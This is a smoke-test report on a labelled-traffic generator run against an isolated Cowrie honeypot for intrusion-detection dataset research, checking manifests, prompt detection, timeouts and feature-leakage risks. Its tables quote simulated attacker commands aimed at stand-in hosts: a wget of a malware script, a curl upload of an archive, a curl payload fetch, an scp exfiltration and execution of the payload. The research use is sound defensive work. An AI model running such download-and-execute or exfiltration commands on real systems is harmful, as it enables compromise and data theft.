# Dataset V2 generator smoke test against isolated Cowrie

**Date:** 2026-11-10, 09:45–09:51 UTC. **Task 7.**

**Scope:** 10 diagnostic sessions (5 profiles × 2) through the unmodified generator 2.1 (`dataset_builder/generate_labelled_traffic.py`) against the isolated Cowrie lab.

**Not done:** no dataset was built; `build_labelled_dataset.py` was not run. No model, specification, extractor, profile, Cowrie or Docker change. No TTY collection, no test-set access, no commits.

## Evidence (this folder)

| Path | Content |
|---|---|
| `plan_smoke_sessions.py`, `configs/*.json`, `configs/seed_selection.json` | Single-profile configs copied from `dataset_builder/profiles_v2_isolated.json`, and the offline seed selection |
| `runs/<profile>/manifest.jsonl`, `runs/<profile>/run_meta.json` | Generator output for each of the 5 runs |
| `evidence/generator_console.txt` | Generator stdout |
| `evidence/cowrie_full_after.json` | Whole `cowrie.json` after the test (241 lines); its first 60 lines hash to the recorded baseline |
| `evidence/cowrie_smoke_slice.json` | Lines 61–241: **the 181 events of this test** |
| `evidence/cowrie_console_0947_0951.txt` | Cowrie's process log for the test window (`docker logs`, read-only) |
| `analyze_smoke.py`, `evidence/comparison.json` | Manifest-to-Cowrie comparison |

**Labels:** [C] confirmed by evidence, [U] unverified, [Rec] recommendation.

## 1. Environment and isolation verification (before any session)

| Check | Result |
|---|---|
| Image | Both containers `cowrie/cowrie@sha256:bf371c37…cc13a`; read-only root filesystem; all capabilities dropped [C] |
| Network | `cowrie-project` only on `cowrie_cowrie_internal` (`internal=true`) [C] |
| Egress | From Cowrie: 1.1.1.1:443, 8.8.8.8:53, 185.220.101.5:80, 192.168.65.254:80 and 172.19.0.1 all *Network is unreachable*; external DNS fails; only route 172.22.0.0/16 [C] |
| Port | `docker port`: `127.0.0.1:2223` only; 172.27.0.1, 192.168.56.1 and 172.20.10.5 refuse 2223 [C] |
| Profiles unchanged | `profiles_v2.json` `182afa5f…`, `attack_profiles.json` `f3cc54a9…`, `profiles_v2_isolated.json` `385af936…`, `attack_profiles_isolated.json` `cce96008…`; identical to Task 2 [C] |
| **Baseline** | `cowrie.json`: **60 lines, 28,390 bytes, SHA-256 `48830e9909aac4b08d17ef5aa255a6a522e9741397588f8c88cfa49acc6239d8`** (the generator independently recorded `log_baseline_lines: 60`) [C] |

**Observations:**

- **Restart:** both containers had been restarted at 09:03:25 UTC (RestartCount 0, created 08:23/08:24, configuration unchanged). This was not caused by this work; the likely cause is a Docker Desktop restart [U].
- **IPs swapped:** after the restart the containers' internal IPs swapped. **Cowrie is now 172.22.0.3 and the relay 172.22.0.2**, which is the `src_ip` of every test session.
- **Lines 59–60** of the baseline are the isolation probe's own connection from Cowrie to itself.

## 2. Test-session design

- **One run per profile:** `generate_labelled_traffic.py --config configs/<profile>.json --sessions 2 --seed 1 --port 2223`. Pacing seed = 1, speed 1.0, prompt timeout 20 s; `--include-held-out` for `data_exfiltration`.
- **Coverage rule fixed in advance:** the smallest seed whose offline plan includes `wget`/`curl` (botnet), `scp` (data_exfiltration), and `ssh` plus `ping`/`nc` (lateral_movement); seed 1 otherwise. Seed 1 met every rule. No session was added or repeated.
- **Planned coverage:** `curl` and `wget`, `scp`, `ping`, two `ssh` forms, 3–5 failed guesses (brute force), and `exit` on every completed session.

## 3. Session summary and manifest-to-Cowrie comparison

**Pairing:** all **21 Cowrie sessions** pair one-to-one, in connect order, with the **21 authentication attempts** in the manifests. Username and password match at every position [C].

| Profile | # | Cowrie session | Auth | Initial prompt | Planned | Sent | Cowrie `command.input` (excluding exit) | Termination (manifest) | `exit` in Cowrie | Cowrie duration (s) |
|---|---|---|---|---|---|---|---|---|---|---|
| benign_admin | 1 | 296c59c18dae | success | yes (0.00 s) | 5 | 5 | 5 | clean_exit, exit_confirmed | yes | 19.2 |
| benign_admin | 2 | 1e636b48faa5 | success after 1 rejected | yes (0.00 s) | 6 | 6 | 6 | clean_exit, exit_confirmed | yes | 14.1 |
| brute_force | 1 | 79062db947f6 | success after 3 rejected | yes (0.05 s) | 0 | 0 | 0 | clean_exit, exit_confirmed | yes | 8.2 |
| brute_force | 2 | 4ac9ce116bca | success after 3 rejected | yes (0.06 s) | 0 | 0 | 0 | clean_exit, exit_confirmed | yes | 4.3 |
| botnet | 1 | 575fc54840c9 | success | yes | 6 | 6 | 6 | clean_exit, exit_confirmed | yes | 20.5 |
| botnet | 2 | fa31b41fec41 | success after 2 rejected | yes | 5 | **3** | 3 | **readiness_timeout at `wget http://192.0.2.40/malware.sh`** | no | 25.7 |
| data_exfiltration | 1 | 3ec180b56529 | success | yes | 4 | 4 | 4 | clean_exit, exit_confirmed | yes | 17.7 |
| data_exfiltration | 2 | 4ecd184f12c6 | success after 1 rejected | yes | 5 | **4** | 4 | **readiness_timeout at `scp …`** | no | 28.9 |
| lateral_movement | 1 | c64d99ef6903 | success | yes | 4 | 4 | 4 | **readiness_timeout at `ssh -o … admin@192.0.2.5`** (last command) | no | 37.4 |
| lateral_movement | 2 | b14aa4b580c4 | success after 1 rejected | yes | 3 | **2** | 2 | **readiness_timeout at `ssh root@192.0.2.5`** | no | 24.9 |

**Accuracy in all 10 logged-in sessions** [C]:

- `commands_sent` equals Cowrie's `command.input` list exactly, in order;
- no sent command is missing from Cowrie;
- **no extra Cowrie-generated lines appeared**: `sh payload` / `./malware.sh` found no file, because the downloads failed;
- `exit` appears in Cowrie exactly when the manifest says `exit_sent: true`;
- every command after a termination is `not_sent_after_termination` and absent from Cowrie.

**Wrong-guess sessions:** all 11 rejected attempts are `rejected` in `auth_log` and `login.failed` in Cowrie, and **closed after 1.1–1.6 s** [C]. This confirms the Task 4 connection fix live; previously they took ~120 s.

## 4. Prompt detection

- **Initial prompt:** detected in all 10 sessions within 0.00–0.06 s [C].
- **After commands:** the prompt returned after 30 commands, with waits of 0.046–0.141 s [C].
- **Possible false positive [U]:** `ping -c 2 192.0.2.5` (lateral_movement #1) was recorded as prompt-returned after **0.047 s**. A real two-packet ping should take about 2 s. Cowrie's process log shows nothing between `ping` and the next command, which was 3.5 s later (think time), so no harm resulted here. But the generator **does not record the terminal output** it matched, so a false positive can't be ruled out. If one happened before a short think time, the next command could be typed into a still-running command.
- **No other anomalies.**

## 5. Blocking-command behaviour

| Command | Cowrie behaviour (evidence) | Prompt within 20 s |
|---|---|---|
| `curl -O http://pkg-repo.example/payload` | Cowrie queried Docker's embedded DNS (127.0.0.11), which answered **SERVFAIL** (console traceback `DNSServerError rCode=2`). The command ended | yes (0.09 s) |
| `curl -T /dev/shm/d.tgz http://192.0.2.10/u` | ended | yes (0.05 s) |
| `wget http://192.0.2.40/malware.sh` | HTTP connection attempt stopped immediately (console: factory start/stop at 09:48:42); **new event `cowrie.session.file_download.failed`** 0.44 s after the command; **no prompt afterwards** | **no**, stuck until the generator closed it |
| `scp /var/tmp/d.tar root@192.0.2.5:/tmp/` | emulated scp waits for stdin; no further event | **no** |
| `ssh … admin@192.0.2.5` / `ssh root@192.0.2.5` | emulated ssh waits for input; no further event | **no** |
| `ping -c 2 192.0.2.5` | see section 4 | yes (0.047 s, unverified) |

**Is the 20 s timeout adequate?**

- Every command that answered did so in ≤ 0.14 s.
- Every command that blocked showed no progress at all: `scp` and `ssh` wait for interactive input, and `wget` hangs after its failed connection.
- **A longer timeout would not have rescued any session**; a shorter one would only shorten the artefact.
- The 20 s is adequate for detection, but it adds an almost constant ~20 s to terminated sessions (section 6).

**Did termination work?** Yes, in all 5 cases [C]:

- nothing further was sent, `exit` included;
- the client closed;
- Cowrie logged "Connection lost" 20.0–20.1 s after the blocking command (for example `wget` at 09:48:42.343 → closed 09:49:02.355).

## 6. Termination and profile-dependent completion

| Profile | Terminated early | Planned → recorded commands |
|---|---|---|
| benign_admin | 0/2 | 11 → 11 |
| brute_force | 0/2 | 0 → 0 |
| botnet | **1/2** (`wget` to an IP) | 11 → 9 |
| data_exfiltration | **1/2** (`scp`) | 9 → 8 |
| lateral_movement | **2/2** (`ssh`) | 7 → 6 |

**Interpretation** (2 sessions per profile, so these are indicative, not rates):

1. **Termination depends on the profile** [C, mechanism]. It happens whenever a profile's plan contains an interactive or hanging emulated command:
   - `lateral_movement`: its `ssh` step has p = 0.6, with two `ssh` forms;
   - `data_exfiltration`: `scp` is one alternative of a p = 0.8 step;
   - `botnet`: `wget` to an IP is one of two download alternatives.

   Benign and brute-force profiles have no such commands.
2. **Fewer recorded commands for some profiles:** terminated sessions lose the remaining commands and `exit`.
3. **Session duration remains a category fingerprint risk:**
   - terminated sessions include ≈ 20 s of generator timeout (durations 24.9–37.4 s vs 14.1–20.5 s for completed sessions with commands);
   - brute-force sessions are short only because they have no commands;
   - `session_duration_s` (conditional group C3) and termination-correlated counts would therefore reveal `lateral_movement` in particular.
4. **Isolation changes behaviour:**
   - `wget` to an IP hangs **because** egress is blocked;
   - in the earlier non-isolated runs (train_v1), downloads returned;
   - this is a lab-specific artefact with low deployment compatibility.
5. **Pacing seeds repeat across runs** [C]:
   - all five runs used `--seed 1`, so session #1 of each run drew the same pacing stream (`pacing:1:1`);
   - its time to first input is ≈ 7.6–7.7 s in every run whose session #1 has no wrong guesses;
   - identical seeds across V2 runs would duplicate timing values.

Category-independent pacing did **not** make the features category-independent. The command semantics of the profiles, interacting with Cowrie's emulation and the lab isolation, now dominate.

## 7. Does the manifest describe what happened?

Yes, for everything it records [C]:

- authentication outcomes;
- sent and unsent commands;
- prompt return, readiness timeouts and the termination action;
- `exit_sent` / `exit_confirmed` (matching Cowrie's `exit` input and channel close);
- statuses.

**Gaps:**

- **(a)** no terminal output tail is stored per command, so readiness decisions can't be audited (section 4). `wait_for_prompt` returns a `tail` on failure, but `run_session` doesn't save it;
- **(b)** no record of *why* a command blocked (download failure vs stdin wait). Cowrie's log has partial evidence (`file_download.failed`).

## 8. Remaining risks

1. **Profile-dependent termination**, and its effects on `session_duration_s`, `input_line_count` and the timing features (C2/C3 leakage).
2. **Possible prompt false positives**, not auditable without output capture.
3. **Download emulation in the isolated lab:** `wget` to an IP hangs, and `curl` to a `.example` name triggers a DNS query to Docker's embedded resolver (answered SERVFAIL; no external resolution observed, but host-side DNS logs were not inspected) [U].
4. **New Cowrie event type `cowrie.session.file_download.failed`,** not covered by `configs/feature_spec_v2.json` (`url_download_events` counts only `cowrie.session.file_download`). The specification was not changed here.
5. **Pacing-seed reuse** across runs duplicates timing.
6. **Container IPs** can change on restart, which changes the `src_ip` value (never a feature).
7. **Sample size:** 10 sessions, so frequencies are indicative only.

## 9. Recommendation

**The generator is not ready for Dataset V2 generation as is.**

**What works:**

- prompt detection on real Cowrie;
- terminating on a blocked shell;
- category-independent pacing;
- the wrong-guess cleanup;
- an accurate manifest.

**Why not ready:** the profile set and the isolated lab produce **profile-dependent termination and duration**, a category fingerprint that the conditional groups C2/C3 would most likely fail.

**Decisions needed before generation** (each needs approval; nothing was changed):

1. **Profiles:** decide how to handle commands that block in Cowrie (`ssh`, `scp`, `wget` to an IP in the isolated lab). Options:
   - remove them from V2 profiles;
   - make them the final step, so they cost no later commands;
   - accept them and treat termination as part of the behaviour, then test with L6/L1 and expect C3 to fail.
2. **Generator change (small):** store a truncated output tail for every command, and the matched prompt text, so readiness decisions are auditable. Optionally use a shorter, documented timeout for terminated sessions to reduce the ~20 s duration artefact.
3. **Run procedure:** require a distinct `--pacing-seed` for every V2 run, recorded and checked for reuse.
4. **Specification:** consider adding `cowrie.session.file_download.failed` to the descriptive download fields in a minor spec revision.
5. **Lab (optional):** a local HTTP sink inside the internal network would let emulated downloads complete without egress. That is an isolation design change and needs separate approval.
6. **Diagnosis (optional):** reading Cowrie's existing TTY logs for the `ping` and `wget` sessions would explain the 0.047 s prompt and the `wget` hang. Not done, because this task excluded TTY use.

## 10. Integrity

- **Created:** this folder (report, scripts, configs, runs, evidence).
- **Modified:** none.
- **Changed outside the repository:** Cowrie's data volume gained 181 log events and 10 TTY recordings, as Cowrie does for every session; there were no downloads.

Details are in the hand-off message.
